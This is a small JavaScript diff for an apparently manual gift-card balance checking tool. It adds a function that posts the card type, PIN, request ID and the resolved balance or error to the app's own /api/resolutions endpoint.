@@ -268,6 +268,24 @@ function addManualRequest() {
 }
 
 // ── Resolve request ───────────────────────────────────────────
+async function syncResolvedToServer(req, status, balance, requestId) {
+  try {
+    await fetch('/api/resolutions', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        cardType: req.cardType,
+        cardPin: req.cardPin,
+        requestId,
+        balance: status === 'ok' ? balance : undefined,
+        error: status !== 'ok' ? 'Card not found or invalid PIN.' : undefined,
+      }),
+    });
+  } catch (e) {
+    console.warn('Sync to server cache failed:', e);
+  }
+}
+
 function resolveRequest(id, status) {
   const balanceInput = document.getElementById('bal_' + id);
   const balance = balanceInput ? balanceInput.value.trim() : '';
@@ -313,6 +331,10 @@ function resolveRequest(id, status) {
         requestId: id,
       }));
     }
+  }
+
+  if (req) {
+    syncResolvedToServer(req, status, balance, id);
   }
 
   renderRequests();
